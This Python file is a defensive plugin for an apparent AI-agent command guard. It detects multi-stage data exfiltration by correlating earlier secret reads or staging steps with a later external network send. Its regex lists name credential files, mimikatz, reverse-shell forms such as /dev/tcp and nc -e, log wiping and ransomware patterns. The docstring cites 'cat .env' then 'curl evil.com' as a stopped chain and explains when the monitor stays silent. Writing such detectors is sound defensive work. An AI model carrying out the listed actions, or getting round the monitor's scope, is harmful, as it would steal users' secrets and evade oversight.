"""killchain — correlate single-step signals into a multi-stage attack, the Holmes (S&P'19) pattern.

The other plugins judge one step. But an attack is a PROGRESSION: read a secret (Credential Access),
base64 it (Defense Evasion), POST it out (Exfiltration). Each step alone may only warrant ALLOW/ASK;
the SEQUENCE is the attack. Holmes' contribution over per-call signatures is to correlate them along
the ATT&CK kill chain and fire on the correlated scenario, not the individual event.

This plugin is deliberately SCOPED to one thing: slow-poisoning data EXFILTRATION, and it is checked
ONLY at a NETWORK SEND. That is the design: `observe()` quietly records, on EVERY step, whether that
step touched sensitive data (credential-access / collection) — but the whole-session look-back that
decides "is this a chain?" runs ONLY when the CURRENT command is an external network send (curl/scp/
POST/…). A send is the one moment data can actually leave, so it's the only moment worth correlating
the history. On any non-network command this plugin does nothing at all — no history scan — and the
per-step plugins (destructive, mitre, pii, provenance, …) handle those exactly as usual.

The firing rule, from the data-exfiltration methodology (mindpointgroup.com/blog/conducting-and-
detecting-data-exfiltration): at a network send to an EXTERNAL destination, look back — if sensitive
data was ACCESSED earlier this session, the send completes an exfiltration chain → DENY. If nothing
sensitive was accessed, or the destination is trusted, it's an ordinary request → silent. So `cat .env`
then `curl evil.com` is stopped; `ls; cat notes; curl github.com` is not.
"""

from __future__ import annotations

import json
import re

from ddbt.core.ledger import EGRESS, destinations, flatten, is_external
from ddbt.plugins.base import Plugin, PluginContext, PreVerdict

_KEY = "killchain_stages"

# Coarse tactic detectors (progression signal, deliberately broader than mitre_guard's exact rules).
_TACTIC = [
    ("credential_access", re.compile(r"\.env\b|id_rsa|/\.ssh/|/\.aws/|credential|\bsecret\b|\.pem\b|"
                                     r"private[_-]?key|/etc/shadow|password|\btoken\b|api[_-]?key|mimikatz|lazagne", re.I)),
    ("collection", re.compile(r"screencapture|/dev/video|/dev/audio|keylog|pynput|mailbox|saved.?address|"
                              r"\bdump\b|select\s+\*|find\s+.*-name|tar\s+-c|zip\s+-r", re.I)),
    ("discovery", re.compile(r"\b(whoami|uname|printenv|netstat|ifconfig|ipconfig|ps\s+aux|"
                             r"ls\s+-R|find\s+/|history)\b", re.I)),
    ("defense_evasion", re.compile(r"base64|b64encode|gzip|xxd|openssl\s+enc|iptables\s+-F|ufw\s+disable|"
                                   r"history\s+-c|rm\s+.*/var/log|chattr|setenforce\s+0", re.I)),
    ("command_and_control", re.compile(r"/dev/tcp/|nc\s+.*-e|ncat\s+.*-e|bash\s+-i|ngrok|reverse\s*shell", re.I)),
    ("persistence", re.compile(r"authorized_keys|crontab\s+-|/etc/cron|systemctl\s+enable|launchd|"
                               r"LaunchDaemons|schtasks\s+/create|New-Service", re.I)),
    ("impact", re.compile(r"rm\s+-[a-z]*[rf]|mkfs\.|dd\s+.*of=/dev/|\bshred\b|:\(\)\s*\{|encrypt|ransom|"
                          r"drop\s+database|truncate\s+table|vssadmin\s+delete", re.I)),
]
# When a network send fires, we look back over the WHOLE history at FULL VIGOUR — all precursor tactics,
# not just the strongest — so a staged poison (recon → collect → encode → send) is caught, not only the
# obvious secret→send. Credential-access is the strongest signal (a secret leaving is unambiguous exfil);
# the rest corroborate a progression.
_CRED = {"credential_access"}                        # read a secret/key — a send after this IS exfil
_PRECURSOR = {"credential_access", "collection", "discovery", "defense_evasion"}  # any staging/recon step


def _stages(tool: str, text: str, external_egress: bool) -> set[str]:
    s = {name for name, pat in _TACTIC if pat.search(text)}
    if external_egress:
        s.add("exfiltration")
    return s


class KillChain(Plugin):
    name = "killchain"
    headline = "These steps together look like a multi-stage attack."

    def __init__(self, trusted_domains: tuple[str, ...] = ()):
        self.trusted = tuple(d.lower() for d in trusted_domains)

    def _external_egress(self, tool: str, text: str) -> bool:
        if not (EGRESS.search(tool) or EGRESS.search(text)):
            return False
        dests = destinations(text)
        return (not dests) or any(is_external(d, self.trusted) for d in dests)

    def _load(self, ctx: PluginContext) -> list[str]:
        if ctx.store is None:
            return []
        try:
            return list(json.loads(ctx.store.get_meta(_KEY) or "[]"))
        except (ValueError, TypeError):
            return []

    def observe(self, tool: str, args: dict, result, ctx: PluginContext) -> None:
        if ctx.store is None:
            return
        text = f"{flatten(args)} {flatten(result)}"
        new = _stages(tool, text, self._external_egress(tool, flatten(args)))
        if not new:
            return
        seen = self._load(ctx)
        for st in sorted(new):
            if st not in seen:
                seen.append(st)             # keep first-seen order for the chain narrative
        ctx.store.set_meta(_KEY, json.dumps(seen[-16:]))

    def pre_check(self, tool: str, args: dict, ctx: PluginContext) -> PreVerdict | None:
        text = flatten(args)
        # SCOPE GATE: the slow-exfil look-back runs ONLY at an external network send — the one moment
        # data can actually leave. Not a network send (or a send to a trusted host) → do nothing at all;
        # we don't even read the history. Every non-network command is left entirely to the per-step
        # plugins. This is the whole point: "when a curl happens, only then look at the history."
        if not self._external_egress(tool, text):
            return None
        # It IS an external send — now check the WHOLE history at FULL VIGOUR. `_load` holds only stages
        # from EARLIER steps (observe runs after this pre_check), so it is exactly the prior history.
        history = self._load(ctx)
        priors = [s for s in dict.fromkeys(history) if s in _PRECURSOR]
        if not priors:
            return None                       # a clean send — nothing suspicious preceded it
        chain = " → ".join(priors) + " → exfiltration"
        # A secret was read, OR a fuller staged progression (≥2 precursors) precedes the send → this is
        # exfiltration. DENY.
        if any(s in _CRED for s in priors) or len(priors) >= 2:
            return PreVerdict("deny", f"completes a data-exfiltration sequence · {chain} — sensitive data "
                              f"was staged earlier this session and this network command sends it to an "
                              f"external destination", self.name, tactic="exfiltration")
        # A single softer precursor (e.g. one collection/recon step) before an external send is suspicious
        # but not conclusive → ASK a human to confirm.
        return PreVerdict("ask", f"looks like a staged exfiltration · {chain} — a data-staging step "
                          f"preceded this external send; confirm it's intended", self.name, tactic="exfiltration")
